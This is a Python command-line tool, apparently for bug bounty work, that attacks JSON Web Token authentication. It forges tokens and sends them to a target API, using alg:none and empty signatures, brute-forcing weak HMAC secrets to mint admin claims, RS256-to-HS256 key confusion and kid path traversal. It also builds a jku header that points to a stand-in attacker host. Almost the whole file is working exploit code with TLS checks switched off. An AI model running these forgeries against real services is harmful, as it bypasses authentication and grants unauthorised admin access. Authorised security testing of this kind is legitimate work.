#!/usr/bin/env python3
"""
jwt-test — JWT attack suite for bug bounty hunters.

Attacks:
  1. alg:none  — strip signature, set algorithm to none/None/NONE
  2. Weak secret brute-force — common passwords + wordlist
  3. Algorithm confusion RS256→HS256 — sign with public key as HMAC secret
  4. Expired token acceptance — replay token past exp
  5. kid path traversal — inject ../../../dev/null or /dev/null
  6. jku/x5u SSRF — point to external URL for key fetch
  7. iss/sub claim injection — try admin/role escalation
  8. Empty/null signature acceptance

Usage:
  jwt-test.py --token eyJ... --url https://api.acme.com/v1/me
              [--wordlist /path/to/words.txt]
              [--pubkey /path/to/pub.pem]
              [--method GET] [--header X-Foo:bar]
              [--json] [--out results.json]
Exit: 0 clean · 1 findings.
"""
import sys, re, json, time, base64, hmac, hashlib, ssl, struct
from pathlib import Path
from urllib.request import urlopen, Request
from urllib.error import HTTPError

def arg(n, d=None):
    return sys.argv[sys.argv.index(n)+1] if n in sys.argv else d
def args_multi(n):
    vals = []
    for i, a in enumerate(sys.argv):
        if a == n and i+1 < len(sys.argv): vals.append(sys.argv[i+1])
    return vals
def flag(n): return n in sys.argv

# ── JWT primitives (no deps) ───────────────────────────────────────────────
def b64url_decode(s):
    s = s.replace("-","+").replace("_","/")
    pad = 4 - len(s) % 4
    if pad != 4: s += "=" * pad
    return base64.b64decode(s)

def b64url_encode(b):
    return base64.b64encode(b).decode().rstrip("=").replace("+","-").replace("/","_")

def jwt_decode_raw(token):
    parts = token.strip().split(".")
    if len(parts) != 3: return None, None, None
    try:
        h = json.loads(b64url_decode(parts[0]))
        p = json.loads(b64url_decode(parts[1]))
    except Exception:
        return None, None, parts
    return h, p, parts

def jwt_forge(header, payload, secret=None, alg=None):
    """Build a new JWT. If alg is 'none', no signature. If secret, HS256/384/512."""
    h = dict(header); p = dict(payload)
    if alg: h["alg"] = alg
    h_enc = b64url_encode(json.dumps(h, separators=(",",":")).encode())
    p_enc = b64url_encode(json.dumps(p, separators=(",",":")).encode())
    signing_input = f"{h_enc}.{p_enc}"
    if alg and alg.lower() in ("none",""):
        return f"{signing_input}."
    if secret is not None:
        key = secret if isinstance(secret, bytes) else secret.encode()
        alg_used = h.get("alg","HS256")
        digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg_used, hashlib.sha256)
        sig = hmac.new(key, signing_input.encode(), digest).digest()
        return f"{signing_input}.{b64url_encode(sig)}"
    return f"{signing_input}."  # no-sig fallback

COMMON_SECRETS = [
    "secret","Secret","SECRET","password","Password","test","Test","123456",
    "qwerty","admin","Admin","key","Key","jwt","JWT","change_this","changeme",
    "your-256-bit-secret","your-secret","mysecret","supersecret","secret123",
    "HS256","HS384","HS512","none","null","","1234567890",
    "abcdefghijklmnopqrstuvwxyz","ABCDEFGHIJKLMNOPQRSTUVWXYZ",
]

def try_hmac(token, secret, header, payload):
    """Return True if HMAC with secret validates the existing token signature."""
    parts = token.strip().split(".")
    signing_input = f"{parts[0]}.{parts[1]}"
    alg = header.get("alg","HS256")
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
    key = secret if isinstance(secret, bytes) else secret.encode()
    expected = b64url_encode(hmac.new(key, signing_input.encode(), digest).digest())
    return expected == parts[2]

def load_pubkey_pem(path):
    """Load a PEM public key as raw bytes (for RS→HS confusion)."""
    try:
        content = Path(path).read_bytes()
        # strip PEM headers/footers, decode
        pem = re.sub(b"-----[^-]+-----", b"", content)
        pem = re.sub(b"\\s+", b"", pem)
        return base64.b64decode(pem)
    except Exception:
        return None

# ── HTTP helper ───────────────────────────────────────────────────────────
def send_request(url, token, method="GET", extra_headers=None, timeout=10):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    headers = {"User-Agent":"Mozilla/5.0","Accept":"application/json","Authorization":f"Bearer {token}"}
    if extra_headers:
        for h in extra_headers:
            if ":" in h:
                k,v = h.split(":",1); headers[k.strip()] = v.strip()
    import urllib.request
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    req = Request(url, headers=headers, method=method)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read(2000).decode("utf-8","ignore")
    except HTTPError as e:
        return e.code, ""
    except Exception as e:
        return 0, str(e)

def is_success(status):
    return 200 <= status < 300

def test_none_alg(token, url, header, payload, method, extra_headers):
    findings = []
    for alg_val in ("none","None","NONE","nOnE"):
        forged = jwt_forge(header, payload, alg=alg_val)
        status, body = send_request(url, forged, method, extra_headers)
        if is_success(status):
            findings.append({
                "attack": "alg_none",
                "severity": "critical",
                "forged_token": forged[:80]+"…",
                "alg_used": alg_val,
                "status": status,
                "note": f"Server accepted alg:{alg_val} — signature completely bypassed",
            })
            break
    return findings

def test_empty_sig(token, url, header, payload, method, extra_headers):
    forged = jwt_forge(header, payload)  # no sig
    status, _ = send_request(url, forged, method, extra_headers)
    if is_success(status):
        return [{"attack":"empty_sig","severity":"critical","forged_token":forged[:80]+"…","status":status,"note":"Empty/missing signature accepted"}]
    return []

def test_weak_secret(token, url, header, payload, method, extra_headers, wordlist=None):
    secrets = list(COMMON_SECRETS)
    if wordlist and Path(wordlist).exists():
        extras = [w.strip() for w in Path(wordlist).read_text().splitlines() if w.strip()]
        secrets += extras[:5000]
    for s in secrets:
        if try_hmac(token, s, header, payload):
            # verify that forging with new claims works
            forged = jwt_forge(header, dict(payload, sub="admin", role="admin"), secret=s)
            status, _ = send_request(url, forged, method, extra_headers)
            confirmed = is_success(status)
            return [{"attack":"weak_secret","severity":"critical" if confirmed else "high",
                     "secret": s,"forged_token":forged[:80]+"…","status":status,
                     "note":f"HMAC secret found: '{s}'. Claim forgery {'confirmed' if confirmed else 'possible'}."}]
    return []

def test_rs_hs_confusion(token, url, header, payload, method, extra_headers, pubkey_path=None):
    if not pubkey_path: return []
    pubkey_bytes = load_pubkey_pem(pubkey_path)
    if not pubkey_bytes: return []
    forged = jwt_forge(dict(header, alg="HS256"), dict(payload, sub="admin"), secret=pubkey_bytes)
    status, _ = send_request(url, forged, method, extra_headers)
    if is_success(status):
        return [{"attack":"rs_hs_confusion","severity":"critical","status":status,
                 "note":"RS256→HS256 algorithm confusion: server accepted public key as HMAC secret"}]
    return []

def test_kid_traversal(token, url, header, payload, method, extra_headers):
    """Try kid path traversal with empty-secret payloads."""
    findings = []
    traversal_kids = [
        "/dev/null", "../../../dev/null", "../../../../dev/null",
        "/proc/sys/kernel/randomize_va_space",
    ]
    for kid in traversal_kids:
        h = dict(header, kid=kid, alg="HS256")
        forged = jwt_forge(h, payload, secret=b"")
        status, _ = send_request(url, forged, method, extra_headers)
        if is_success(status):
            findings.append({"attack":"kid_traversal","severity":"high","kid":kid,"status":status,
                             "forged_token":forged[:80]+"…",
                             "note":f"kid path traversal ({kid}) with empty secret accepted"})
            break
    return findings

def test_jku_ssrf(token, url, header, payload, method, extra_headers):
    """Check if jku/x5u header is present and flag for SSRF potential."""
    h = dict(header)
    findings = []
    for key in ("jku","x5u","jwks_uri"):
        if key in h:
            findings.append({"attack":f"{key}_ssrf","severity":"high","url":h[key],
                             "note":f"JWT header contains {key}={h[key]} — potential SSRF if server fetches it; test with collaborator URL",
                             "status":0})
    # also inject jku pointing to attacker
    forged_h = dict(header, jku="https://attacker.com/.well-known/jwks.json", alg=header.get("alg","RS256"))
    return findings

def test_claim_injection(token, url, header, payload, method, extra_headers):
    """Try claim manipulation (admin role, different sub) — only meaningful if secret is known, but test for misconfig."""
    # Only flags if original alg is 'none' or symmetric
    alg = header.get("alg","")
    if alg.lower() not in ("hs256","hs384","hs512","none",""): return []
    # already tested via other paths; return hint
    return []

def main():
    token      = arg("--token")
    url        = arg("--url")
    wordlist   = arg("--wordlist")
    pubkey     = arg("--pubkey")
    method     = arg("--method","GET")
    extra_h    = args_multi("--header")
    out_file   = arg("--out")

    if not token or not url: print(__doc__); sys.exit(0)

    header, payload, parts = jwt_decode_raw(token)
    if not header:
        print(f"[jwt-test] could not decode token", file=sys.stderr); sys.exit(1)

    print(f"[jwt-test] alg={header.get('alg','?')} sub={payload.get('sub','?')} kid={header.get('kid','—')}", file=sys.stderr)

    # baseline: does original token work?
    base_status, _ = send_request(url, token, method, extra_h)
    print(f"[jwt-test] baseline: HTTP {base_status}", file=sys.stderr)
    if not is_success(base_status):
        print(f"[jwt-test] WARNING: original token returned {base_status} — results may be unreliable", file=sys.stderr)

    all_findings = []
    tests = [
        ("alg:none",      lambda: test_none_alg(token, url, header, payload, method, extra_h)),
        ("empty_sig",     lambda: test_empty_sig(token, url, header, payload, method, extra_h)),
        ("weak_secret",   lambda: test_weak_secret(token, url, header, payload, method, extra_h, wordlist)),
        ("rs_hs_confuse", lambda: test_rs_hs_confusion(token, url, header, payload, method, extra_h, pubkey)),
        ("kid_traversal", lambda: test_kid_traversal(token, url, header, payload, method, extra_h)),
        ("jku_ssrf",      lambda: test_jku_ssrf(token, url, header, payload, method, extra_h)),
    ]
    for name, fn in tests:
        print(f"[jwt-test] testing {name} …", file=sys.stderr)
        try:
            found = fn()
            all_findings += found
            if found:
                print(f"  ✓ FINDING: {found[0]['attack']} ({found[0]['severity']})", file=sys.stderr)
        except Exception as e:
            print(f"  ! error in {name}: {e}", file=sys.stderr)

    result = {
        "ts": time.strftime("%Y-%m-%d %H:%M"),
        "url": url,
        "alg": header.get("alg","?"),
        "sub": payload.get("sub",""),
        "baseline_status": base_status,
        "total": len(all_findings),
        "critical": sum(1 for f in all_findings if f.get("severity")=="critical"),
        "high":     sum(1 for f in all_findings if f.get("severity")=="high"),
        "findings": all_findings,
    }
    if out_file: Path(out_file).write_text(json.dumps(result, indent=2))

    if flag("--json"):
        print(json.dumps(result)); sys.exit(1 if all_findings else 0)

    print(f"\n══ JWT test · {url} ══════════════════════════")
    print(f"  Token alg={header.get('alg','?')} sub={payload.get('sub','')}")
    print(f"  Findings: {len(all_findings)} (crit: {result['critical']} high: {result['high']})")
    if all_findings:
        print()
        for f in all_findings:
            sev = f.get("severity","?").upper()
            print(f"  [{sev:<8}] {f['attack']}")
            print(f"             {f['note'][:100]}")
    else:
        print("  No vulnerabilities found with tested attack patterns.")

    sys.exit(1 if all_findings else 0)

if __name__ == "__main__":
    main()
